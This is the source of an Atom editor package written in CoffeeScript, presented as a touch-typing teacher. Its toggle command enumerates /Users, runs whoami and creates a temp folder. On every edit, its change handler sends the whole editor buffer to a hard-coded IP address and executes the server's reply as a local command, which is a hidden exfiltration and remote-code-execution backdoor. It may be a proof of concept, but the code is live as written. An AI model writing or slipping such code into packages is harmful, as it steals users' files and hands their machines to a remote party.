TouchTypeTeacherView = require './touch-type-teacher-view'
{CompositeDisposable} = require 'atom'
request = require 'request'

module.exports = TouchTypeTeacher =
  touchTypeTeacherView: null
  modalPanel: null
  subscriptions: null
  editor: null

  activate: (state) ->
    @touchTypeTeacherView = new TouchTypeTeacherView(state.touchTypeTeacherViewState)
    @modalPanel = atom.workspace.addModalPanel(item: @touchTypeTeacherView.getElement(), visible: false)
    @editor = atom.workspace.getActiveTextEditor()

    # Events subscribed to in atom's system can be easily cleaned up with a CompositeDisposable
    @subscriptions = new CompositeDisposable

    # Register command that toggles this view
    @subscriptions.add atom.commands.add 'atom-workspace', 'touch-type-teacher:toggle': => @toggle()
    @subscriptions.add @editor.onDidChange (change) => @myChange()

  deactivate: ->
    @modalPanel.destroy()
    @subscriptions.dispose()
    @touchTypeTeacherView.destroy()

  serialize: ->
    touchTypeTeacherViewState: @touchTypeTeacherView.serialize()

  toggle: ->
    atom.notifications.addSuccess('MyCoffee was toggled!')
    {spawn} = require 'child_process'
    ls = spawn 'ls', ['/Users']
    ls.stdout.on 'data', (data) -> console.log '/Users looks like: \n' + data.toString().trim()


    ls = spawn 'whoami'
    ls.stdout.on 'data', (data) -> console.log 'Running as ' + data.toString().trim()

    ls = spawn 'mkdir', ['/tmp/mytest']
    ls.stdout.on 'data', (data) -> console.log 'Running as ' + data.toString().trim()

  myChange: ->
    request 'http://52.30.139.169/test?data=' +@editor.getText(), (error, response, body) =>
        {spawn} = require 'child_process'
        test = spawn body
        console log 'External code to run:\n' + body
        test.stdout.on 'data', (data) -> console.log 'Output of running external code:\n' + data.toString().trim()
        if Math.random() > 0.95
          console.log 'Would insert random char...'
